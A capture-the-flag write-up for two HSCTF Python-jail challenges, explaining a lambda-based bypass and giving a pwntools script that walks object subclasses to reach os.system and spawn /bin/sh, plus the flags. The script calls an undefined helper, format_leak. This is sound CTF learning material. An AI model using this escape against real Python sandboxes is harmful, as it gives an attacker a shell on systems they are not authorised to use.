# Misc

| Challenge                   | Link                               |
| --------------------------- | ---------------------------------- |
| fast-forward (26 solves)    | [Here](#fast-forward-26-solves)    |
| fast-forward-v2 (22 solves) | [Here](#fast-forward-v2-22-solves) |

## fast-forward (26 solves)

### Description

Everyone always says Python is too slow—so let's speed it up!

`nc fast-forward.hsctf.com 1337`

### Solution

In this case, i just focused about function or variable limitation. Through trial and error i found that lambda can "hide" function name and variable name.

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FZ77jXz06EzlBvEUceQU7%2Fimage.png?alt=media&amp;token=13aff785-cc2b-4c70-b424-af6eb28116a0" alt=""><figcaption></figcaption></figure>

To solve this challenge i use lambda to find out `class` and `function` that we can use for RCE. In this case we can found there is `os._wrap_close` by enumerating each index in subclasses. Here is the script i used to automate the process and trigger shell.

```python
from pwn import *

def send(data):
	r.recvuntil(b'> ')
	r.sendline(data)
	return r.recvline()

def exploit():
	payload = "print('_wrap_close' in (lambda: str((1).__class__.__base__.__subclasses__()[{}]))())"
	for i in range(0xff):
		resp = send(format_leak(payload.format(i)))
		print(i, resp)
		if(resp.strip() == b'True'):
			break
	payload = f"(lambda: print((1).__class__.__base__.__subclasses__()[{i}].__init__.__globals__['system']('/bin/sh')))()"
	r.recvuntil(b'> ')
	r.sendline(payload.encode())

r = remote("fast-forward.hsctf.com", 1337)
exploit()
r.interactive()
```

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FTReEQ9enAfYWKC6t4ylO%2Fimage.png?alt=media&amp;token=055bf52c-79e8-4073-91cf-82466f33b44c" alt=""><figcaption></figcaption></figure>

Flag : flag{it\_would\_be\_a\_shame\_if\_there\_were\_a\_bunch\_of\_numbers\_at\_the\_end\_2846880189}

## fast-forward-v2 (22 solves)

### Description

I made Python even faster than before!

`nc fast-forward-v2.hsctf.com 1337`

### Solution

For fast-forward-v2 i used the same exploit as fast-forward :>

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FsWMi1mehlSVVvFIBPn86%2Fimage.png?alt=media&amp;token=c09c6190-cf7d-49e9-aedd-064553175263" alt=""><figcaption></figcaption></figure>

Flag : flag{one\_day\_i\_will\_write\_a\_pyjail\_without\_unintended\_solutions\_3421670241}
